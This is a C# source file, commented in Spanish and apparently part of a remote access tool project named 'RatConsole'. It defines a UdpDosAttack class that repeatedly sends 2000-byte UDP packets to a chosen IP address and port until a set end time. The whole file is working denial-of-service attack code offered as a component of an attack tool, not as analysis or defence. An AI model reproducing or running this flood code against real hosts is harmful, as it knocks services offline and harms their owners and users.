using System;
using System.Net.Sockets;

namespace RatConsole.Domain.Services.DoS
{
	/// <summary>
	///		Clase para llevar a cabo un ataque DoS utilizando UDP
	/// </summary>
	internal class UdpDosAttack : AbstractDoSAttack
	{
		internal UdpDosAttack(string ip, int port, TimeSpan delay, DateTime end) : base(ip, port, delay, end)
		{
		}

		/// <summary>
		///		Procesa el ataque
		/// </summary>
		internal override void Process()
		{
			while (!CheckEnd())
                try
                {
					// Envía los datos del ataque
					using (UdpClient client = new UdpClient())
					{
						byte[] buffer = GetAttackData(2000);

							// Conecta al servidor
							client.Connect(Ip, Port); //Connect to the server
							// Envía los datos
							client.Send(buffer, buffer.Length);
							// Cierra la conexión
							client.Close();
					}
					// Espera
					Wait();
                }
                catch (Exception ex)
                {
                    System.Diagnostics.Debug.WriteLine("DoS UDP error: " + ex.Message);
                }
		}
	}
}
